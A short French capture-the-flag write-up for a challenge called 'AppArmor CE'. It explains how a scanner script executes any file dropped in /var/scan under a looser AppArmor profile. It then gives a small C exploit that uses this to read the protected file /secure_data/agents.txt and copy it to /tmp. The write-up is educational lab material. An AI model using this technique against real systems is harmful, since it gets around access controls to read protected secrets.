# AppArmor CE

## Analyse

Le script `scanner.sh` parcourt toutes les 30 secondes `/var/scan`, execute chaque fichier trouvé, puis le supprime. L'éxcution se fait avec une transition AppArmor vers `var_scan_binary` :

```bash
name=$(basename "$binary")
log "Execution de : $name (sous profil AppArmor: var_scan_binary)"

timeout 10 "$binary" >> "$LOG" 2>&1 || true

rm -f "$binary"
```

Le profil `player_shell` bloque la lecture directe du flag :

```text
deny /secure_data/agents.txt r,
```

Le profil `var_scan_binary` est plus permissif :

```text
/secure_data/**  r,
/tmp/**          rw,
```

La solution consiste donc a déposer dans `/var/scan` un binaire qui lit `/secure_data/agents.txt` et recopie le contenu dans `/tmp/agent.txt`.

## Exploit

Le fichier `exploit.c` :

```c
#include <stdio.h>

int main(void) {
	char buf[4096];
	FILE *in  = fopen("/secure_data/agents.txt", "r");
	FILE *out = fopen("/tmp/agent.txt", "w");
	fwrite(buf, 1, fread(buf, 1, sizeof buf, in), out);
	return 0;
}
```

Le contenu se retrouve dans `/tmp/agent.txt`.

